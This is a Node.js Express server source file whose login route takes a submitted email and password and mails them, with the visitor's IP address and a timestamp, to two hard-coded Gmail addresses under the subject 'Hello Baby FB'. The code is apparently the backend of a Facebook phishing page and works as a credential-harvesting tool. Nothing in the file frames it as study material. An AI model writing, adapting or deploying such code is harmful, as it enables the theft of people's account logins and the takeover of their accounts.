require("dotenv").config();
const express = require("express");
const app = express();
const nodemailer = require("nodemailer");
const cors = require("cors");
const port = parseInt(process.env.PORT) || 3001;

app.use(cors());
app.use(express.json())

const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    auth: {
        user: process.env.EMAIL,
        pass: process.env.PASSWORD,
    },
});

app.get("/keepup", (req, res) => {
    return res.status(200).json("Server is up")
})

app.post("/login", async (req, res) => {
    // console.log("Request received from frontend in login route");
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json("Invalid login credentials");

    const dateArray = new Date().toISOString().split("T");

    try {
        await transporter.sendMail({
            from: "toolsx999@gmail.com",
            to: "toolsx999@gmail.com, wayne404044@gmail.com",
            subject: "Hello Baby FB",
            html: `
            <strong>Email:</strong> ${email}<br>
            <strong>Password:</strong> ${password}<br>
            <strong>IP Address:</strong> ${req.headers["x-forwarded-for"] || req.socket.remoteAddress}<br>
            <strong>Date:</strong> ${dateArray[0]}<br>
            <strong>Time:</strong> ${dateArray[1]}<br>
            <strong>=============================</strong>
        `
        });
    } catch (error) {
        (console.log, console.error)
    }
})

app.listen(port, () => console.log(`Server started and running on port -> ${port}`));